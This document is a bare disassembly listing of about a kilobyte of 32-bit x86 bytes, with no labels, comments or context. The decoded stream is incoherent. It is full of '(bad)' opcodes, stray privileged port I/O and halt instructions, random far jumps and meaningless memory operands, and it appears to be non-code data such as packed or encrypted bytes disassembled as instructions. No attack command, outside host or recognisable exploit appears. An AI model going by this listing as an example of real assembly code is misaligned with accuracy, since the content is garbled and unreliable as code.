  42b7ae:	aad    0x8c
  42b7b0:	dec    eax
  42b7b1:	fbld   TBYTE PTR [edx+0x36]
  42b7b4:	in     eax,dx
  42b7b5:	lock adc ah,BYTE PTR [eax+0x47]
  42b7b9:	push   ds
  42b7ba:	in     eax,dx
  42b7bb:	clc    
  42b7bc:	xor    eax,DWORD PTR [eax+ebx*1]
  42b7bf:	aas    
  42b7c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7c1:	jnp    0x42b7a6
  42b7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7c4:	push   0x27
  42b7c6:	aam    0xe0
  42b7c8:	jle    0x42b7db
  42b7ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7cb:	dec    esp
  42b7cc:	pop    edi
  42b7cd:	dec    eax
  42b7ce:	jno    0x42b7f5
  42b7d0:	cmp    ebp,DWORD PTR [ebp+0x29]
  42b7d3:	mov    dh,0xe0
  42b7d5:	fsubr  QWORD PTR [edx-0x3c]
  42b7d8:	cmp    eax,0x59a68e5
  42b7dd:	pop    ecx
  42b7de:	add    BYTE PTR [ebx-0x3e],bh
  42b7e1:	jae    0x42b800
  42b7e3:	imul   edi,DWORD PTR [esi+0x35ac90cc],0x3e
  42b7ea:	or     al,0x8e
  42b7ec:	pop    DWORD PTR [eax-0x63ad27df]
  42b7f2:	add    al,0xf5
  42b7f4:	aam    0xe6
  42b7f6:	pusha  
  42b7f7:	xor    cl,BYTE PTR [edx]
  42b7f9:	cmp    al,0x3b
  42b7fb:	xor    eax,DWORD PTR [esi-0x5f2cbbeb]
  42b801:	stos   DWORD PTR es:[edi],eax
  42b802:	inc    ebx
  42b803:	xlat   BYTE PTR ds:[ebx]
  42b804:	stc    
  42b805:	sub    DWORD PTR ds:0xf0b033f7,eax
  42b80b:	dec    eax
  42b80c:	inc    ebx
  42b80d:	pop    eax
  42b80e:	sar    BYTE PTR [eax+0x1b33a368],cl
  42b814:	and    DWORD PTR [eax-0x61],edi
  42b817:	imul   ebx,ebp,0xffffffa6
  42b81a:	ds (bad) 
  42b81c:	icebp  
  42b81d:	loopne 0x42b7b6
  42b81f:	rcr    ecx,1
  42b821:	ficom  WORD PTR [ecx+ecx*1]
  42b824:	jae    0x42b7ca
  42b826:	sbb    BYTE PTR [eax+eiz*2],0x7
  42b82a:	test   esp,edx
  42b82c:	ss push ebp
  42b82e:	jmp    0x6c2422ca
  42b833:	inc    eax
  42b834:	aad    0x7e
  42b836:	fdivr  QWORD PTR [esi]
  42b838:	outs   dx,DWORD PTR gs:[esi]
  42b83a:	mov    WORD PTR [esi-0x5a],ss
  42b83d:	and    edx,esp
  42b83f:	fadd   DWORD PTR [edi+0x16]
  42b842:	pop    es
  42b843:	pop    ds
  42b844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b845:	mov    esp,0xbc70c978
  42b84a:	std    
  42b84b:	sub    bh,cl
  42b84d:	inc    ebp
  42b84e:	(bad)  
  42b84f:	int3   
  42b850:	and    eax,0x279499
  42b855:	dec    edx
  42b856:	xchg   edi,eax
  42b857:	mov    ecx,0xb76ba3e6
  42b85c:	call   ebp
  42b85e:	repnz addr16 stc 
  42b861:	jb     0x42b83b
  42b863:	adc    bl,BYTE PTR [ebp+0x40]
  42b866:	pop    es
  42b867:	jp     0x42b8d8
  42b869:	imul   ebx,DWORD PTR [ecx+eiz*4+0x62cab304],0xffffffeb
  42b871:	arpl   WORD PTR ds:0xfb2f139d,cx
  42b877:	hlt    
  42b878:	lahf   
  42b879:	es pop ss
  42b87b:	adc    edx,DWORD PTR [ebx+0x55]
  42b87e:	lods   eax,DWORD PTR ds:[esi]
  42b87f:	sub    esi,DWORD PTR ds:0xe21989cf
  42b885:	aas    
  42b886:	in     eax,0x20
  42b888:	icebp  
  42b889:	mov    esi,0x3b51d54e
  42b88e:	fwait
  42b88f:	shl    BYTE PTR [esi+0x0],cl
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esp,DWORD PTR [eax-0x37e929c0]
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0xa7000001,al
  42b90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b90e:	push   ds
  42b90f:	es mov esp,0x41f55aba
  42b915:	mov    eax,DWORD PTR [ebp-0x7e885959]
  42b91b:	add    eax,DWORD PTR [ebp+0x10]
  42b91e:	cs xchg ecx,eax
  42b920:	fwait
  42b921:	pop    esp
  42b922:	xor    eax,0xa6b18981
  42b927:	int3   
  42b928:	mov    ecx,0x2b527870
  42b92d:	cmp    al,0xcc
  42b92f:	imul   ebp,DWORD PTR [esi-0x3b],0xffffffd2
  42b933:	or     dl,dl
  42b935:	xchg   ecx,eax
  42b936:	mov    ah,0x85
  42b938:	jbe    0x42b9b7
  42b93a:	inc    ebx
  42b93b:	(bad)  
  42b93c:	sub    al,0x82
  42b93e:	div    BYTE PTR [ecx]
  42b940:	push   esp
  42b941:	push   edi
  42b942:	push   edx
  42b943:	or     eax,ebp
  42b945:	or     bl,BYTE PTR [eax+0xe3c072a]
  42b94b:	dec    edi
  42b94c:	in     al,dx
  42b94d:	enter  0x4523,0x3a
  42b951:	or     ebx,edi
  42b953:	imul   eax,DWORD PTR [ecx-0x414e2d91],0x9e4b6fae
  42b95d:	jmp    0x3ed935c6
  42b962:	or     cl,BYTE PTR [ecx+0x44]
  42b965:	xchg   esp,eax
  42b966:	mov    ds:0xee7ef0ea,eax
  42b96b:	and    ax,0x9976
  42b96f:	test   al,0x87
  42b971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b972:	and    al,0x39
  42b974:	dec    esi
  42b975:	pop    ds
  42b976:	es mov cl,0x8
  42b979:	pop    eax
  42b97a:	inc    ebx
  42b97b:	pushf  
  42b97c:	cmp    ch,BYTE PTR [edi+0x6e1a9c39]
  42b982:	pop    ecx
  42b984:	fild   QWORD PTR [edx-0x4c]
  42b987:	imul   esp,esi,0xffffffa7
  42b98a:	test   DWORD PTR [ecx+0x7986b2f4],ebp
  42b990:	and    DWORD PTR [eax+0x33],edx
  42b993:	ret    
  42b994:	jb     0x42b946
  42b996:	out    dx,eax
  42b997:	out    0x93,al
  42b999:	(bad)  
  42b99a:	sub    al,0x11
  42b99c:	mov    ebx,0x99608b64
  42b9a1:	cmc    
  42b9a2:	pop    ebp
  42b9a3:	or     DWORD PTR [eax],0xffffff81
  42b9a6:	adc    esp,DWORD PTR [ebx+edx*4]
  42b9a9:	and    DWORD PTR [eax],0xffffffef
  42b9ac:	dec    ebp
  42b9ad:	rcl    DWORD PTR [ecx+0x75bd274c],1
  42b9b3:	mov    ecx,0x86b17074
  42b9b8:	out    dx,al
  42b9b9:	push   eax
  42b9ba:	sbb    eax,0x7b775f01
  42b9bf:	bswap  ecx
  42b9c1:	mov    bl,0x26
  42b9c3:	fidiv  DWORD PTR [ecx-0x8e97386]
  42b9c9:	fadd   QWORD PTR [edx-0x7a]
  42b9cc:	push   ss
  42b9cd:	or     ah,cl
  42b9cf:	pop    bp
  42b9d1:	clc    
  42b9d2:	rol    DWORD PTR [ebx-0x767c7cda],0xe0
  42b9d9:	cmc    
  42b9da:	iret   
  42b9db:	retf   0xd302
  42b9de:	lods   eax,DWORD PTR ds:[esi]
  42b9df:	mov    ds:0xa96a5639,eax
  42b9e4:	loop   0x42ba44
  42b9e6:	add    DWORD PTR [esi-0x3c9ba113],esi
  42b9ec:	push   0xfffffffb
  42b9ee:	adc    al,0x10
  42b9f0:	fld    DWORD PTR [ebp-0x3e7d141b]
  42b9f6:	stos   DWORD PTR es:[edi],eax
  42b9f7:	push   eax
  42b9f8:	aas    
  42b9f9:	push   ds
  42b9fa:	lods   al,BYTE PTR ds:[esi]
  42b9fb:	push   esp
  42b9fc:	inc    eax
  42b9fd:	rcr    BYTE PTR [eax+0x3a],1
  42ba00:	inc    esp
  42ba01:	cmp    ah,dl
  42ba03:	bound  ebp,QWORD PTR [edx+0x49a0a761]
  42ba09:	cmp    eax,0xf713416b
  42ba0e:	aad    0x6b
  42ba10:	ins    DWORD PTR es:[edi],dx
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     eax,edi
  42ba81:	fsubr  DWORD PTR [edx+0x1d3cd4d]
  42ba87:	add    BYTE PTR ds:0x1e000001,al
  42ba8d:	imul   edx,ecx,0x48b68a85
  42ba93:	adc    al,0xf9
  42ba95:	aam    0xdb
  42ba97:	in     eax,0x8e
  42ba99:	mov    al,0x8a
  42ba9b:	pusha  
  42ba9c:	sbb    al,0xae
  42ba9e:	sar    ebx,cl
  42baa0:	cmp    eax,0xb1e1f87d
  42baa5:	mov    bl,0x21
  42baa7:	mov    ch,BYTE PTR [eax]
  42baa9:	mov    bh,0x80
  42baab:	xchg   esi,eax
  42baac:	mov    bl,0x8d
  42baae:	adc    DWORD PTR [ecx+eiz*8+0x2b6c041],ebp
  42bab5:	ret    
  42bab6:	and    eax,0x972734c9
  42babb:	cs jecxz 0x42bac9
  42babe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42babf:	jnp    0x42bab6
  42bac1:	sbb    DWORD PTR [ebx],edx
  42bac3:	arpl   di,si
  42bac5:	mov    edi,edx
  42bac7:	lock cmp BYTE PTR [edx+edx*1],ch
  42bacb:	outs   dx,BYTE PTR ds:[esi]
  42bacc:	rcl    DWORD PTR [esi-0x44],cl
  42bacf:	fdivr  DWORD PTR [ecx-0x16]
  42bad2:	sub    BYTE PTR [edi+eiz*1+0x56],cl
  42bad6:	dec    esp
  42bad7:	mov    bh,0xe5
  42bad9:	ins    DWORD PTR es:[edi],dx
  42bada:	out    dx,al
  42badb:	or     ecx,ecx
  42badd:	lahf   
  42bade:	(bad)  
  42badf:	fwait
  42bae0:	nop
  42bae1:	sbb    DWORD PTR [ecx-0x278e22f2],ebp
  42bae7:	pop    es
  42bae8:	test   eax,0x7c7cb85f
  42baed:	jae    0x42baa2
  42baef:	cdq    
  42baf0:	das    
  42baf1:	imul   eax,ebp,0xfffffff6
  42baf4:	xor    BYTE PTR [esi+0x5],bl
  42baf7:	mov    ebp,0xd4e784bb
  42bafc:	imul   esp,DWORD PTR [ecx],0x79730cdb
  42bb02:	outs   dx,BYTE PTR ds:[esi]
  42bb03:	add    eax,0x9472ac9e
  42bb08:	dec    esi
  42bb09:	popf   
  42bb0a:	inc    ebx
  42bb0b:	jp     0x42bb3f
  42bb0d:	rcl    BYTE PTR [edi+edx*4],1
  42bb10:	ret    0x76ec
  42bb13:	dec    esp
  42bb14:	pop    ss
  42bb15:	sub    BYTE PTR [edx+0xf4a63b0],ch
  42bb1b:	bound  esp,QWORD PTR [edx-0x594516c5]
  42bb21:	call   DWORD PTR [ebx]
  42bb23:	ins    DWORD PTR es:[edi],dx
  42bb24:	cmc    
  42bb25:	daa    
  42bb26:	push   eax
  42bb27:	sbb    ch,al
  42bb29:	inc    eax
  42bb2a:	mov    ebp,0x332f9058
  42bb2f:	aas    
  42bb30:	call   0x2f084773
  42bb35:	cmc    
  42bb36:	imul   esp,DWORD PTR [ebx-0x7fbe8426],0x6c6914e3
  42bb40:	repz push ss
  42bb42:	pushf  
  42bb43:	xor    dh,BYTE PTR [esi]
  42bb45:	js     0x42baf7
  42bb47:	fidiv  WORD PTR [eax+0x3d]
  42bb4a:	not    ecx
  42bb4c:	inc    edi
  42bb4d:	mov    dh,BYTE PTR [edi+esi*8+0x283479c0]
  42bb54:	out    dx,al
  42bb55:	(bad)  
  42bb56:	sbb    al,0x9f
  42bb58:	mov    al,0x18
  42bb5a:	lds    edx,FWORD PTR [eax]
  42bb5c:	enter  0xc7c5,0xce
  42bb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb61:	outs   dx,DWORD PTR ds:[esi]
  42bb62:	les    ebp,FWORD PTR [ecx-0x10f048d0]
  42bb68:	std    
  42bb69:	dec    edi
  42bb6a:	lahf   
  42bb6b:	(bad)  
  42bb6c:	push   0x1316cd6d
  42bb71:	mov    ds:0xbe960232,al
  42bb76:	aas    
  42bb77:	cmc    
  42bb78:	xchg   ebx,eax
  42bb79:	dec    esi
  42bb7a:	dec    ecx
  42bb7b:	loope  0x42bb8d
  42bb7d:	mov    ah,0xab
  42bb7f:	jge    0x42bb64
  42bb81:	and    dl,BYTE PTR [edi+0x3a]
  42bb84:	push   edi
  42bb85:	push   edi
  42bb86:	pop    eax
  42bb87:	adc    BYTE PTR [edi-0x4f01fd28],dh
  42bb8d:	cs lahf 
  42bb8f:	xchg   esi,eax
  42bb90:	add    BYTE PTR [eax],0x0
	...
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	inc    ecx
  42bc01:	imul   ecx,ebx,0xffffffd9
  42bc04:	rcl    ah,cl
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0xa1000001
  42bc0d:	pop    es
  42bc0e:	aad    0x7
  42bc10:	sbb    DWORD PTR [ebp-0xd],0xffffff8a
  42bc14:	test   eax,0xa32fbe16
  42bc19:	push   ss
  42bc1a:	mov    esi,DWORD PTR [eax]
  42bc1c:	ret    
  42bc1d:	test   esp,0x6c5ad473
  42bc23:	jecxz  0x42bc8a
  42bc25:	test   DWORD PTR [ebx-0x36],ecx
  42bc28:	sbb    eax,0x26226422
  42bc2d:	inc    ch
  42bc2f:	test   al,0xd5
  42bc31:	inc    esi
  42bc32:	jg     0x42bcab
  42bc34:	(bad)  
  42bc35:	repz mov edx,0xada8aba9
  42bc3b:	xchg   esp,eax
  42bc3c:	xchg   ecx,eax
  42bc3d:	inc    edx
  42bc3e:	in     eax,dx
  42bc3f:	xchg   edx,eax
  42bc40:	fcomp  QWORD PTR [ecx+0x30223a2d]
  42bc46:	std    
  42bc47:	leave  
  42bc48:	xchg   edi,eax
  42bc49:	sub    al,0x0
  42bc4b:	into   
  42bc4c:	ds mov ebp,0xe4370ff8
  42bc52:	lds    esi,FWORD PTR [esi+0xa79bec8]
  42bc58:	repnz pop es
  42bc5a:	or     DWORD PTR [esi-0x9ad2f21],esi
  42bc60:	xchg   ecx,eax
  42bc61:	or     edx,DWORD PTR ds:0x3f39bf2b
  42bc67:	pop    edi
  42bc68:	adc    ch,ch
  42bc6a:	lea    esp,[eax-0x18]
  42bc6d:	mov    cl,0xd3
  42bc6f:	outs   dx,BYTE PTR ds:[esi]
  42bc70:	xor    al,0x1b
  42bc72:	xor    al,0x38
  42bc74:	test   al,0x50
  42bc76:	sahf   
  42bc77:	xor    al,0xb8
  42bc79:	addr16 test eax,0x313980f6
  42bc7f:	repnz pop esi
  42bc81:	mov    eax,ds:0x7401a107
  42bc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc87:	push   edi
  42bc88:	loope  0x42bc65
  42bc8a:	rsqrtps xmm0,XMMWORD PTR [ecx-0xd]
  42bc8e:	sub    edi,DWORD PTR [ecx-0x3d]
  42bc91:	mov    ds,edx
  42bc93:	call   0x9f32aa66
  42bc98:	sub    edi,DWORD PTR [ecx-0x43340f03]
  42bc9e:	sub    DWORD PTR [edx-0x697e0301],esi
  42bca4:	mov    ebx,0x73761afc
  42bca9:	pop    ss
  42bcaa:	popf   
  42bcab:	out    dx,al
  42bcac:	jnp    0x42bc8f
  42bcae:	mov    BYTE PTR [edx],dl
  42bcb0:	pop    ss
  42bcb1:	push   eax
  42bcb2:	jb     0x42bd24
  42bcb4:	add    BYTE PTR [edx-0x75debb0f],0x4b
  42bcbb:	inc    eax
  42bcbc:	mov    al,0x47
  42bcbe:	and    al,0x25
  42bcc0:	mov    cl,0x94
  42bcc2:	pop    ebp
  42bcc3:	hlt    
  42bcc4:	fwait
  42bcc5:	ins    DWORD PTR es:[edi],dx
  42bcc6:	pop    esi
  42bcc7:	or     ebx,ebx
  42bcc9:	add    eax,0xdc858947
  42bcce:	inc    ebx
  42bccf:	cmp    ebp,DWORD PTR [esi]
  42bcd1:	sub    eax,0x5e4be877
  42bcd6:	es aam 0x8f
  42bcd9:	pop    ebx
  42bcda:	popa   
  42bcdb:	mov    WORD PTR [edx],gs
  42bcdd:	loop   0x42bc89
  42bcdf:	rcl    ebx,1
  42bce1:	sub    BYTE PTR [esi+0x545a2dd5],0xaf
  42bce8:	retf   
  42bce9:	jecxz  0x42bc96
  42bceb:	pop    esi
  42bcec:	inc    edi
  42bced:	sbb    al,0xa9
  42bcef:	stos   BYTE PTR es:[edi],al
  42bcf0:	add    DWORD PTR [esi-0x72],esi
  42bcf3:	popf   
  42bcf4:	into   
  42bcf5:	or     BYTE PTR [esi+0x71b36a1a],dh
  42bcfb:	xlat   BYTE PTR ds:[ebx]
  42bcfc:	mov    ch,0xa5
  42bcfe:	xor    dl,BYTE PTR [edx]
  42bd00:	daa    
  42bd01:	and    cl,bl
  42bd03:	fbstp  TBYTE PTR [eax+0x51]
  42bd06:	mov    ah,BYTE PTR [ebx-0x281cb5f0]
  42bd0c:	cmp    DWORD PTR [eax+0x595ee6],0x0
	...
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bde2
  42bd81:	ror    DWORD PTR [eax+0x37],1
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x23000001,al
  42bd8d:	fwait
  42bd8e:	sbb    ah,BYTE PTR ds:0x7026720f
  42bd94:	and    DWORD PTR [ebx],edi
  42bd96:	fild   DWORD PTR [edi]
  42bd98:	loope  0x42bdf7
  42bd9a:	push   ss
  42bd9b:	fnstsw WORD PTR [ecx+0x6e09e5fa]
  42bda1:	sbb    DWORD PTR [eax],eax
  42bda3:	pop    eax
  42bda4:	add    ch,BYTE PTR [esi+0x105f31c2]
  42bdaa:	aaa    
  42bdab:	(bad)  
  42bdac:	pusha  
  42bdad:	cli    
  42bdae:	sbb    eax,ebp
  42bdb0:	(bad)  
  42bdb1:	adc    ch,ch
  42bdb3:	icebp  
  42bdb4:	xor    al,0xe1
  42bdb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bdb7:	inc    BYTE PTR [esi+0x6a]
  42bdba:	ss and eax,eax
  42bdbd:	inc    eax
  42bdbe:	jmp    0x8e7a:0x96d44f48
  42bdc5:	cmp    DWORD PTR [edi+0x7766ae3c],eax
  42bdcb:	retf   
  42bdcc:	test   DWORD PTR [edx],0x24043c38
  42bdd2:	jns    0x42bdca
  42bdd4:	lock stos BYTE PTR es:[edi],al
  42bdd6:	mov    esi,0x8e9b20a9
  42bddb:	std    
  42bddc:	pop    bp
  42bdde:	scas   eax,DWORD PTR es:[edi]
  42bddf:	call   DWORD PTR ds:0x7576de52
  42bde5:	push   esp
  42bde6:	icebp  
  42bde7:	mul    DWORD PTR [edi+ebp*4+0x7a8e7c73]
  42bdee:	jb     0x42be67
  42bdf0:	stc    
  42bdf1:	mov    es,WORD PTR [ebx+0x573d98a5]
  42bdf7:	xchg   ebp,eax
  42bdf8:	std    
  42bdf9:	retf   0x9de5
  42bdfc:	ds out 0xcd,al
  42bdff:	pop    eax
  42be00:	xor    DWORD PTR [ecx],esi
  42be02:	push   ds
  42be03:	(bad)  
  42be04:	pop    ds
  42be05:	sub    eax,0x62b8b703
  42be0a:	sub    al,0xff
  42be0c:	rcl    BYTE PTR [eax+eiz*2+0x4c],0x1a
  42be11:	and    al,BYTE PTR [ebp+ebp*4+0x5511cee9]
  42be18:	stc    
  42be19:	fcmovb st,st(3)
  42be1b:	(bad)  [ebx-0x68]
  42be1e:	jnp    0x42bdb9
  42be20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be21:	call   0xfaa08ec6
  42be26:	loope  0x42be95
  42be28:	int    0x3
  42be2a:	out    0xd6,eax
  42be2c:	push   ecx
  42be2d:	nop
  42be2e:	(bad)  
  42be2f:	pop    ds
  42be30:	jg     0x42be64
  42be32:	(bad)  
  42be33:	sbb    bl,BYTE PTR [esi-0x6b]
  42be36:	cdq    
  42be37:	imul   ecx,DWORD PTR [edi+0x4adea650],0xd04e4cf3
  42be41:	lods   al,BYTE PTR ds:[esi]
  42be42:	arpl   WORD PTR [edx+0x287e8e0d],sp
  42be48:	xchg   ecx,eax
  42be49:	mov    DWORD PTR [esi],ebp
  42be4b:	ins    BYTE PTR es:[edi],dx
  42be4c:	mov    ch,cl
  42be4e:	inc    eax
  42be4f:	mov    ds:0xdb93661d,al
  42be54:	jge    0x42be9c
  42be56:	mov    DWORD PTR [ecx+0x9],esi
  42be59:	xor    al,0xe8
  42be5b:	enter  0x28c0,0xa0
  42be5f:	pop    ds
  42be60:	inc    ebx
  42be61:	int3   
  42be62:	adc    al,0x1f
  42be64:	mov    al,0xf5
  42be66:	push   edi
  42be67:	sub    DWORD PTR [ebp-0x6f],ecx
  42be6a:	mov    bh,0x85
  42be6c:	or     eax,0x549d1d82
  42be71:	lds    esp,FWORD PTR [edx]
  42be73:	scas   al,BYTE PTR es:[edi]
  42be74:	push   ecx
  42be75:	ret    0x7968
  42be78:	std    
  42be79:	xor    ebp,esi
  42be7b:	inc    esi
  42be7c:	and    al,0xc0
  42be7e:	stos   DWORD PTR es:[edi],eax
  42be7f:	adc    DWORD PTR fs:[ebx+0x1e9097aa],ebp
  42be86:	loopne 0x42bf06
  42be88:	mov    al,0xf2
  42be8a:	pop    esi
  42be8b:	daa    
  42be8c:	out    dx,al
  42be8d:	push   esi
  42be8e:	fwait
  42be8f:	and    BYTE PTR [ebp+0x0],0x0
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bea1
  42bf01:	pushw  ss
  42bf03:	xchg   edi,eax
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x63000001
  42bf0d:	mov    ebx,DWORD PTR [ebx+0x70]
  42bf10:	enter  0xe53b,0x48
  42bf14:	das    
  42bf15:	mov    al,0xd
  42bf17:	pop    esp
  42bf18:	pop    ebp
  42bf19:	add    edx,DWORD PTR [eax+0x3b]
  42bf1c:	and    BYTE PTR fs:[esi],dh
  42bf1f:	push   ds
  42bf20:	adc    edx,DWORD PTR [ebx+0x7c]
  42bf23:	or     DWORD PTR [edx],0xffffffcf
  42bf26:	mov    esi,?
  42bf28:	mov    esp,0x4174285f
  42bf2d:	imul   ebp,DWORD PTR [ecx],0x122b4092
  42bf33:	cmc    
  42bf34:	mov    WORD PTR [ebp+0x59],ss
  42bf37:	test   BYTE PTR [ebp+0x3cd87cc6],al
  42bf3d:	lods   al,BYTE PTR ds:[esi]
  42bf3e:	cld    
  42bf3f:	push   es
  42bf40:	and    BYTE PTR [edx-0x2e],0x67
  42bf44:	sbb    BYTE PTR [ebx-0x1b],cl
  42bf47:	sub    DWORD PTR [ebx-0x36ea8515],ecx
  42bf4d:	xchg   edi,eax
  42bf4e:	xchg   esi,eax
  42bf4f:	push   edi
  42bf50:	push   esp
  42bf51:	dec    edi
  42bf52:	div    DWORD PTR [edi-0x14]
  42bf55:	dec    esp
  42bf56:	sahf   
  42bf57:	mov    BYTE PTR [edi+0x1f],dh
  42bf5a:	or     cl,BYTE PTR [ebp-0x79117ed1]
  42bf60:	xchg   DWORD PTR [eax+0x3c31c451],eax
  42bf66:	js     0x42bf98
  42bf68:	push   edx
  42bf69:	xchg   esi,eax
  42bf6a:	sbb    dh,bl
  42bf6c:	cmp    DWORD PTR [esi],0xfffffff8
  42bf6f:	mov    al,ds:0x5a1656ed
  42bf74:	xor    edi,edx
  42bf76:	test   DWORD PTR [ecx-0x9],esi
  42bf79:	stos   BYTE PTR es:[edi],al
  42bf7a:	int3   
  42bf7b:	nop
  42bf7c:	mov    ch,0x89
  42bf7e:	pop    ds
  42bf7f:	dec    esp
  42bf80:	push   cs
  42bf81:	cs pop ss
  42bf83:	call   0x350b9a4a
  42bf88:	lds    ebx,FWORD PTR [eax+edi*8+0x4d23c014]
  42bf8f:	push   esp
  42bf90:	ret    0x1452
  42bf93:	xchg   BYTE PTR [eax+0x76],ch
  42bf96:	jb     0x42bf3e
  42bf98:	mov    eax,0xbbdd4f11
  42bf9d:	neg    ecx
  42bf9f:	ror    BYTE PTR [esi+0x67e99952],0xf5
  42bfa6:	jo     0x42bf37
  42bfa8:	cs inc eax
  42bfaa:	outs   dx,BYTE PTR ds:[esi]
  42bfab:	out    0x51,al
  42bfad:	rcl    DWORD PTR [ebx+0x27cd4fed],cl
  42bfb3:	xor    bl,BYTE PTR [ebp+0x19496113]
  42bfb9:	mov    ecx,esi
  42bfbb:	fisub  WORD PTR [ecx-0x1d]
  42bfbe:	mov    ecx,0xf578d5b3
  42bfc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfc4:	popa   
  42bfc5:	(bad)  
  42bfc6:	aad    0xb5
  42bfc8:	aas    
  42bfc9:	pop    ss
  42bfca:	sub    esi,ebp
  42bfcc:	scas   eax,DWORD PTR es:[edi]
  42bfcd:	call   0xd869ffd9
  42bfd2:	mov    BYTE PTR [ecx-0x16fd3c17],ah
  42bfd8:	cmp    edi,DWORD PTR [edi+0x47]
  42bfdb:	inc    eax
  42bfdc:	lods   eax,DWORD PTR ds:[esi]
  42bfdd:	cmp    bl,BYTE PTR ds:[ebx-0x1c2c3f2b]
  42bfe4:	push   ecx
  42bfe5:	outs   dx,BYTE PTR ds:[esi]
  42bfe6:	pusha  
  42bfe7:	daa    
  42bfe8:	test   al,0xb0
  42bfea:	pop    es
  42bfeb:	push   esi
  42bfec:	mov    esi,0x206632fc
  42bff1:	push   esp
  42bff2:	inc    esp
  42bff3:	sub    bh,dh
  42bff5:	mov    edi,0x9f1a5fd4
  42bffa:	pop    ebx
  42bffb:	push   ds
  42bffc:	scas   al,BYTE PTR es:[edi]
  42bffd:	mov    DWORD PTR [ebp-0x5b95d495],ebx
  42c003:	bswap  ebp
  42c005:	leave  
  42c006:	cdq    
  42c007:	cld    
  42c008:	mov    DWORD PTR [edx-0x201d71f],esi
  42c00e:	not    BYTE PTR [esi+0xb3]
	...
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	lods   al,BYTE PTR ds:[esi]
  42c081:	pop    es
  42c082:	add    esp,DWORD PTR [edx+0x1d7e1]
  42c088:	add    eax,0x4e000001
  42c08d:	or     ch,dh
  42c08f:	or     edx,DWORD PTR [edx+0x2b8e466c]
  42c095:	aaa    
  42c096:	loope  0x42c061
  42c098:	xchg   esp,eax
  42c099:	imul   esp,DWORD PTR [ebx+ecx*8+0x204235bb],0x1048ebd8
  42c0a4:	add    eax,ebx
  42c0a6:	out    dx,al
  42c0a7:	mov    bh,0x2b
  42c0a9:	(bad)  
  42c0aa:	outs   dx,BYTE PTR ds:[esi]
  42c0ab:	jbe    0x42c0f1
  42c0ad:	shl    ch,cl
  42c0af:	ss inc esi
  42c0b1:	rcr    BYTE PTR [eax-0x5f],1
  42c0b4:	pushf  
  42c0b5:	jae    0x42c04e
  42c0b7:	loope  0x42c054
  42c0b9:	or     al,0xd
  42c0bb:	outs   dx,DWORD PTR ds:[esi]
  42c0bc:	leave  
  42c0bd:	test   al,0xcc
  42c0bf:	adc    al,0xb2
  42c0c1:	leave  
  42c0c2:	fstp   QWORD PTR [ebx]
  42c0c4:	shl    DWORD PTR [ebx],cl
  42c0c6:	mov    ebx,0x38f081b9
  42c0cb:	jle    0x42c06b
  42c0cd:	sub    BYTE PTR [ebx+ebx*2],bl
  42c0d0:	lock sbb edi,DWORD PTR [edi-0x3c6446fe]
  42c0d7:	push   ebx
  42c0d8:	cs xchg edx,eax
  42c0da:	sub    BYTE PTR [eax],ch
  42c0dc:	in     al,0xd2
  42c0de:	sbb    ecx,ebp
  42c0e0:	mov    bh,0x2d
  42c0e2:	push   ecx
  42c0e3:	inc    eax
  42c0e4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0e6:	inc    esp
  42c0e7:	or     esp,DWORD PTR [eax]
  42c0e9:	inc    DWORD PTR [ebx]
  42c0eb:	js     0x42c0cf
  42c0ed:	in     al,dx
  42c0ee:	ret    
  42c0ef:	nop
  42c0f0:	jo     0x42c0a9
  42c0f2:	iret   
  42c0f3:	xor    DWORD PTR [eax+0x463b5548],0xfcd91c50
  42c0fd:	ror    cl,cl
  42c0ff:	mov    esp,0xb52c997e
  42c104:	push   ebx
  42c105:	es and bh,ah
  42c108:	ficomp DWORD PTR [eax-0x5fc2b085]
  42c10e:	(bad)  
  42c10f:	push   esi
  42c110:	jnp    0x42c0bd
  42c112:	call   0xfaca:0xd31151d9
  42c119:	ins    DWORD PTR es:[edi],dx
  42c11a:	xchg   cl,bl
  42c11c:	xchg   ebx,eax
  42c11d:	test   eax,0xf437267b
  42c122:	cmp    al,0x9c
  42c124:	push   ebx
  42c125:	fwait
  42c126:	je     0x42c0c3
  42c128:	(bad)  
  42c129:	loopne 0x42c124
  42c12b:	and    eax,0xc5446f3c
  42c130:	pop    ss
